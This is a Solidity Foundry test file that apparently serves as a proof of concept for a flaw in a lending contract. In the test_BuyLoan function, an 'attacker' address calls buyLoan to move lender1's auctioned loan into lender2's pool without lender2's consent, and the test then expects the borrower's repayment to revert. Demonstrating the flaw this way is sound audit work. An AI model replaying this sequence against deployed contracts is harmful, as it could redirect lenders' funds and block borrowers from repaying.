// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/Lender.sol";
import "forge-std/console.sol";

import {ERC20} from "solady/src/tokens/ERC20.sol";

contract TERC20 is ERC20 {
    function name() public pure override returns (string memory) {
        return "Test ERC20";
    }

    function symbol() public pure override returns (string memory) {
        return "TERC20";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }

    function balance(address owner) public view returns (uint256) {
        return balanceOf(owner);
    }
}

contract BuyLoandTest is Test {
    Lender public lender;

    TERC20 public loanToken;
    TERC20 public collateralToken;

    address public lender1 = address(0x1);
    address public lender2 = address(0x2);
    address public borrower = address(0x3);
    address public fees = address(0x4);
    address public lender3 = address(0x6);
    address public attacker = address(0x7);

    uint256 public borrowerFee = 50;
    uint256 LOANTOKEN_BALANCE = 100000 * 10 ** 18;
    uint256 COLLATERAL_BALANCE = 100000 * 10 ** 18;
    uint256 BORROWER_INIT_LOANTOKEN_BALANCE = 100000 * 10 ** 18;

    uint256 POOL_LOAN_TOKEN_BALANCE = 1000 * 10 ** 18;
    uint256 LOAN_AMOUNT = 1000 * 10 ** 18;

    function setUp() public {
        lender = new Lender();
        loanToken = new TERC20();
        collateralToken = new TERC20();

        loanToken.mint(address(lender1), LOANTOKEN_BALANCE);
        loanToken.mint(address(lender2), 2 * LOANTOKEN_BALANCE);
        loanToken.mint(address(lender3), 2 * LOANTOKEN_BALANCE);
        loanToken.mint(address(borrower), BORROWER_INIT_LOANTOKEN_BALANCE);

        collateralToken.mint(address(borrower), COLLATERAL_BALANCE);

        vm.startPrank(lender1);
        loanToken.approve(address(lender), LOANTOKEN_BALANCE);
        collateralToken.approve(address(lender), COLLATERAL_BALANCE);

        vm.startPrank(lender2);
        loanToken.approve(address(lender), LOANTOKEN_BALANCE);
        collateralToken.approve(address(lender), COLLATERAL_BALANCE);

        vm.startPrank(lender3);
        loanToken.approve(address(lender), LOANTOKEN_BALANCE);
        collateralToken.approve(address(lender), COLLATERAL_BALANCE);

        vm.startPrank(borrower);
        loanToken.approve(address(lender), LOANTOKEN_BALANCE);
        collateralToken.approve(address(lender), COLLATERAL_BALANCE);
    }

    function test_BuyLoan() public {
        vm.startPrank(lender1);
        Pool memory p1 = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: POOL_LOAN_TOKEN_BALANCE,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });

        Pool memory p2 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 2 * POOL_LOAN_TOKEN_BALANCE,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 seconds,
            interestRate: 1100,
            outstandingLoans: 0
        });

        bytes32 poolIdOne = lender.setPool(p1);

        vm.startPrank(lender2);
        bytes32 poolIdTwo = lender.setPool(p2);

        bytes32[] memory poolIds = new bytes32[](3);
        poolIds[0] = poolIdOne;
        poolIds[1] = poolIdTwo;

        uint256[] memory loansIds = new uint256[](1);
        loansIds[0] = 0;

        vm.startPrank(borrower);
        Borrow memory b = Borrow({poolId: poolIdOne, debt: LOAN_AMOUNT, collateral: 1000 * 10 ** 18});
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);

        logPools(poolIdOne, poolIdTwo);

        vm.startPrank(lender1);
        lender.startAuction(loansIds);

        vm.warp(1 days / 24);

        vm.startPrank(attacker);
        lender.buyLoan(loansIds[0], poolIds[1]);

        logPools(poolIdOne, poolIdTwo);

        vm.startPrank(borrower);
        vm.expectRevert();
        lender.repay(loansIds);
    }

    function logPools(bytes32 poolOne, bytes32 poolTwo) public view {
        (,,,,,,,, uint256 outstandingLoans) = lender.pools(poolOne);
        console.log("Pool1, lender 1", outstandingLoans);

        (,,,,,,,, outstandingLoans) = lender.pools(poolTwo);
        console.log("Pool2, Attacker", outstandingLoans);

        console.log("*********************************");

        (address loandLender,,,,,,,,,) = lender.loans(0);
        console.log(loandLender);
    }
}
